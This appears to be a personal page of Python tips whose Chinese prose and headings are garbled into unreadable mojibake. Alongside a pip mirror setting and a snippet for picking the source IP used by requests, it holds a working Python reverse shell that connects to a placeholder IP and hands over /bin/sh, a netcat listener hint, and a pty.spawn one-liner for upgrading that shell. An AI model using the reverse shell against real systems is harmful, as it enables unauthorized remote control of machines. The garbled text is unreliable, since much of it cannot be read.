#д��ǰ��

�źߣ�Python�ܺ�����...��¼һ��ڿƼ���

���㳢��һ������ʱ��ע���Լ���py�ļ����Ʋ�����������������粻Ҫ����flask.py

----

#����pipԴ

```
echo """
[global]
index-url = https://pypi.doubanio.com/simple/
""">~/.pip/pip.conf
```

#����shell

�����Լ��ķ���������**nc -l �˿�**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(( "IP��ַ" , �˿� ))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

##���һ��tty

    python -c 'import pty; pty.spawn("/bin/sh")'

----

#��requestsʹ�ö��IP

```python
import socket
real_create_conn = socket.create_connection
def set_src_addr(*args):
    address, timeout = args[0], args[1]
    source_address = ( ��Ҫʹ�õ�IP , 0)
    return real_create_conn(address, timeout, source_address)
socket.create_connection = set_src_addr
import requests
```